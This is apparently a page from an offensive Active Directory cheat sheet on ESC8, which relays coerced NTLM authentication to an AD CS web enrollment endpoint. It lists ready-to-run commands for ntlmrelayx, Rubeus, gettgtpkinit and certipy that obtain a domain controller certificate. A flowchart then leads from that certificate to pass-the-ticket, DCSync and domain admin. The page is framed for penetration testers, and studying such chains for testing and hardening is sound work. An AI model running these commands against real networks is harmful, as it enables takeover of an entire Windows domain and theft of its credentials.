# Web Enrollment Relay (esc8)

If the CA exposes its HTTP enrollment endpoint, coerced machine authentication can be relayed to it to request a certificate for the coerced account. Relay a domain controller and you get a certificate that authenticates as that DC.

## Why It Works

The web enrollment interface accepts NTLM authentication and, by default, without channel binding. That makes it a relay target — and a certificate, unlike a relayed session, is durable authentication material you keep.

## Prerequisites

* CA web enrollment reachable over HTTP
* A coercion primitive to trigger authentication

## Execution

**Web Enrollment Is Up**

* ESC8
  * `ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController` [\[tool\]](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
    * `Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt` [\[tool\]](https://github.com/GhostPack/Rubeus)
    * `gettgtpkinit.py -pfx-base64 $(cat cert.b64) <domain>/<dc_name>$ <ccache_file>` [\[tool\]](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)
      * **→ Pass the ticket**
        * **→ DCSYNC**
        * **→ LDAP shell**
          * **→ Domain admin**
  * `certipy relay -target http://<ip_ca>` [\[tool\]](https://github.com/ly4k/Certipy)
    * `certipy auth -pfx <certificate> -dc-ip <dc_ip>` [\[tool\]](https://github.com/ly4k/Certipy)

{% hint style="info" %}
Coerce a DC, relay to ESC8, obtain the DC certificate, then use it for DCSync — one of the most reliable full-domain chains against an unhardened ADCS deployment.
{% endhint %}

## Related

* [Authentication Coercion](file:///9685693/coercion-relay/authentication-coercion.md) — triggering the authentication
* [NTLM Relay](file:///9685693/coercion-relay/ntlm-relay.md) — the relay mechanics
